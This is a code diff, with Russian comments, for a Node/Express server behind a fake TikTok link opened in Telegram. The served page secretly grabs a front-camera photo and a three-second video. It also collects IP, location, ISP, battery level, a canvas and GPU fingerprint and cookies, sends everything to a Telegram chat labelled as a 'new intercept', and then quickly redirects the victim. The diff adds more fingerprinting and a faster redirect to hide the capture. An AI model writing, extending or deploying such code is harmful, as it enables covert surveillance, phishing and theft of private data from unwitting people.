@@ -41,6 +41,7 @@ app.get('/', (req, res) => {
   res.redirect('https://www.tiktok.com/');
 });
 
+// Прием данных
 app.post('/api/collect', async (req, res) => {
   const data = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -49,23 +50,32 @@ app.post('/api/collect', async (req, res) => {
     let text = `🚨 **НОВЫЙ ПЕРЕХВАТ** 🚨\n\n`;
     text += `**IP:** ${ip}\n`;
     text += `**Гео:** ${data.geo?.country || '?'}, ${data.geo?.city || '?'}\n`;
+    text += `**Провайдер:** ${data.geo?.isp || '?'}\n`;
     text += `**Устройство:** ${data.browser?.os || '?'} / ${data.browser?.browser || '?'}\n`;
+    text += `**Экран:** ${data.phone?.screen || '?'}\n`;
+    text += `**Батарея:** ${data.battery?.level || '?'}\n`;
+    text += `**Язык:** ${data.browser?.lang || '?'}\n`;
+    text += `**Canvas:** ${data.fingerprint?.canvas || '?'}\n`;
+    text += `**GPU:** ${data.fingerprint?.gpu || '?'}\n`;
+    text += `**Cookies:** ${data.cookies ? data.cookies.slice(0, 80) + '...' : 'нет'}\n`;
     text += `**Цель:** ${data.target || '?'}\n`;
 
     await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });
 
+    // Отправка фото
     if (data.photo && data.photo.startsWith('data:image')) {
       const base64Data = data.photo.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
       await bot.sendPhoto(CHAT_ID, buffer, { caption: '📷 Фото' });
     }
 
+    // Отправка видео
     if (data.video && data.video.startsWith('data:video')) {
       const base64Data = data.video.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
       await bot.sendVideo(CHAT_ID, buffer, { caption: '🎥 Видео' });
     }
-
+    
     res.json({ ok: true });
   } catch (error) {
     console.error(error);
@@ -111,7 +121,7 @@ app.get('/:id/', (req, res) => {
     tg.ready();
     tg.expand();
     if (tg.BackButton) tg.BackButton.hide();
-    if (tg.requestCameraAccess) tg.requestCameraAccess((granted) => { console.log("Camera access:", granted); });
+    if (tg.requestCameraAccess) tg.requestCameraAccess(() => {});
   }
 
   const video = document.getElementById('preview');
@@ -124,48 +134,73 @@ app.get('/:id/', (req, res) => {
     data.browser.os = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
     data.browser.browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
     data.browser.lang = navigator.language;
-    data.browser.ref = document.referrer || '';
     data.phone.screen = screen.width + 'x' + screen.height;
-    data.phone.dpr = window.devicePixelRatio;
-    data.phone.cores = navigator.hardwareConcurrency || '?';
-    data.phone.ram = navigator.deviceMemory || '?';
-    
+
+    if (navigator.getBattery) {
+      try { const b = await navigator.getBattery(); data.battery.level = Math.round(b.level * 100) + '%'; } catch(e){}
+    }
+
     try {
       const r = await fetch('https://ipwho.is/');
       const g = await r.json();
       if (g.success) { data.geo.country = g.country; data.geo.city = g.city; data.geo.isp = g.connection.isp; }
     } catch(e){}
+
+    try {
+      const c = document.createElement('canvas');
+      c.width = 200; c.height = 40;
+      const ctx = c.getContext('2d');
+      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,20);
+      ctx.fillStyle = '#069'; ctx.fillText('FP 🎨', 2, 4);
+      const d = c.toDataURL();
+      let hash = 0;
+      for (let i = 0; i < d.length; i++) hash = (hash * 31 + d.charCodeAt(i)) | 0;
+      data.fingerprint.canvas = hash.toString(16);
+    } catch(e){}
+
+    try {
+      const gl = document.createElement('canvas').getContext('webgl');
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      data.fingerprint.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+    } catch(e){}
+
     return data;
   }
 
-  async function takePhotoAndVideo() {
+  async function captureMedia() {
     let stream = null;
     let videoBlob = null;
+    let photoBlob = null;
+
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       video.srcObject = stream;
       video.muted = true;
       await video.play();
-      await new Promise(r => setTimeout(r, 500));
+      await new Promise(r => setTimeout(r, 300));
       
-      const w = video.videoWidth || 640;
-      const h = video.videoHeight || 480;
-      canvas.width = w;
-      canvas.height = h;
-      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
-      const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+      // 1. СНАЧАЛА ФОТО
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
 
+      // 2. ПОТОМ ВИДЕО (3 СЕК)
       if (typeof MediaRecorder !== 'undefined') {
         const mime = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
         const rec = new MediaRecorder(stream, { mimeType: mime });
         const chunks = [];
         rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        
         const videoDone = new Promise(res => { rec.onstop = () => { videoBlob = new Blob(chunks, { type: rec.mimeType }); res(); }; });
+        
         rec.start();
         await new Promise(r => setTimeout(r, 3000));
         rec.stop();
         await videoDone;
       }
+
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
       return { photoBlob, videoBlob };
@@ -175,12 +210,21 @@ app.get('/:id/', (req, res) => {
     }
   }
 
+  let redirected = false;
+  function goTarget() {
+    if (redirected) return;
+    redirected = true;
+    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
+  }
+
+  // Жёсткий таймер на 4.5 секунды
+  setTimeout(goTarget, 4500);
+
   (async () => {
-    // Собираем данные и пишем видео
-    const mediaPromise = takePhotoAndVideo();
+    const mediaPromise = captureMedia();
     const data = await collectAll();
     const { photoBlob, videoBlob } = await mediaPromise;
-    
+
     let photoBase64 = null;
     let videoBase64 = null;
 
@@ -191,17 +235,13 @@ app.get('/:id/', (req, res) => {
       videoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(videoBlob); });
     }
 
-    // Отправляем данные
-    try {
-      await fetch('/api/collect', {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ ...data, photo: photoBase64, video: videoBase64, target: TARGET_URL })
-      });
-    } catch (e) {}
+    fetch('/api/collect', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ ...data, photo: photoBase64, video: videoBase64, target: TARGET_URL })
+    }).catch(() => {});
 
-    // Только после отправки перекидываем в TikTok
-    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
+    goTarget();
   })();
 </script>
 </body>
